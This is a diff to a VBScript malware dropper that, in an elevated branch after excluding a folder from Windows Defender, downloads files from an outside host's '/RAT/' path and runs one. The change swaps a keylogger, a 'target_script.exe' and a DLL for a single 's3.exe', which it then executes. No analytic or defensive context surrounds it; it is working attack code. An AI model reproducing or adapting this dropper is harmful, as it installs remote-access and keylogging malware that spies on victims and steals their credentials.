@@ -49,12 +49,10 @@ ElseIf WScript.Arguments(0) = "uac_launched" Then
         'WScript.Echo "Folder successfully excluded from Windows Defender."
     End If
 '//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    ' Array of files to download (***REPLACE WITH YOUR URLS AND FILENAMES***)
+    ' Array of files to download
     arrFiles = Array( _
         Array("https://arth.imbeddex.com/RAT/del.vbs", "del.vbs"), _
-        Array("https://arth.imbeddex.com/RAT/keylogger.exe", "key_l.exe"), _
-        Array("https://arth.imbeddex.com/RAT/target_script.exe", "target_script.exe"), _
-        Array("https://arth.imbeddex.com/RAT/network_lib.dll", "network_lib.dll") _
+        Array("https://arth.imbeddex.com/RAT/s3.exe", "s3.exe") _
     )
 
     ' Loop through the files to download
@@ -91,9 +89,10 @@ ElseIf WScript.Arguments(0) = "uac_launched" Then
             'WScript.Echo "Failed to download file: " & strURL
         End If
     Next
+
 '//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
     ' Set the file name to execute
-    strExecutableFileName = "target_script.exe" ' The name of the file to execute
+    strExecutableFileName = "s3.exe" ' The name of the file to execute
 
     ' Loop through downloaded files and check if it's the one we need to execute
     For Each arrFile In arrFiles
